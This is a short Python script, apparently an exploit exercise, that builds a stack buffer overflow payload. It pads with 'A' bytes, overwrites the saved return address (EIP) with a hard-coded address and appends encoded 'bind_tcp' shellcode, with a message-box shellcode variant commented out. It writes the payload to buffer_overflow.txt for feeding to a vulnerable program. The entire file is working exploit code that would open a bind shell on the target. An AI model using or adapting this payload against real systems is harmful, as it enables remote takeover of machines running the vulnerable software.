import struct

junk = "\x41" * 12
eip = struct.pack("<L", 0x7489C7CC)
#junk2 = "\xcc" * 2
#message box
#sploit = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff\xd7"
#bind_tcp
sploit = "\xb8\x44\xeb\x81\xa3\xda\xd8\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x53\x83\xea\xfc\x31\x42\x0e\x03\x06\xe5\x63\x56\x7a\x11\xe1\x99\x82\xe2\x86\x10\x67\xd3\x86\x47\xec\x44\x37\x03\xa0\x68\xbc\x41\x50\xfa\xb0\x4d\x57\x4b\x7e\xa8\x56\x4c\xd3\x88\xf9\xce\x2e\xdd\xd9\xef\xe0\x10\x18\x37\x1c\xd8\x48\xe0\x6a\x4f\x7c\x85\x27\x4c\xf7\xd5\xa6\xd4\xe4\xae\xc9\xf5\xbb\xa5\x93\xd5\x3a\x69\xa8\x5f\x24\x6e\x95\x16\xdf\x44\x61\xa9\x09\x95\x8a\x06\x74\x19\x79\x56\xb1\x9e\x62\x2d\xcb\xdc\x1f\x36\x08\x9e\xfb\xb3\x8a\x38\x8f\x64\x76\xb8\x5c\xf2\xfd\xb6\x29\x70\x59\xdb\xac\x55\xd2\xe7\x25\x58\x34\x6e\x7d\x7f\x90\x2a\x25\x1e\x81\x96\x88\x1f\xd1\x78\x74\xba\x9a\x95\x61\xb7\xc1\xf1\x46\xfa\xf9\x01\xc1\x8d\x8a\x33\x4e\x26\x04\x78\x07\xe0\xd3\x7f\x32\x54\x4b\x7e\xbd\xa5\x42\x45\xe9\xf5\xfc\x6c\x92\x9d\xfc\x91\x47\x0b\xf4\x34\x38\x2e\xf9\x87\xe8\xee\x51\x60\xe3\xe0\x8e\x90\x0c\x2b\xa7\x39\xf1\xd4\xd6\xe5\x7c\x32\xb2\x05\x29\xec\x2a\xe4\x0e\x25\xcd\x17\x65\x1d\x79\x5f\x6f\x9a\x86\x60\xa5\x8c\x10\xeb\xaa\x08\x01\xec\xe6\x38\x56\x7b\x7c\xa9\x15\x1d\x81\xe0\xcd\xbe\x10\x6f\x0d\xc8\x08\x38\x5a\x9d\xff\x31\x0e\x33\x59\xe8\x2c\xce\x3f\xd3\xf4\x15\xfc\xda\xf5\xd8\xb8\xf8\xe5\x24\x40\x45\x51\xf9\x17\x13\x0f\xbf\xc1\xd5\xf9\x69\xbd\xbf\x6d\xef\x8d\x7f\xeb\xf0\xdb\x09\x13\x40\xb2\x4f\x2c\x6d\x52\x58\x55\x93\xc2\xa7\x8c\x17\xf2\xed\x8c\x3e\x9b\xab\x45\x03\xc6\x4b\xb0\x40\xff\xcf\x30\x39\x04\xcf\x31\x3c\x40\x57\xaa\x4c\xd9\x32\xcc\xe3\xda\x16"

buffer = junk + eip + sploit

with open("buffer_overflow.txt", 'w') as outfile:
    outfile.write(buffer)
    outfile.close()
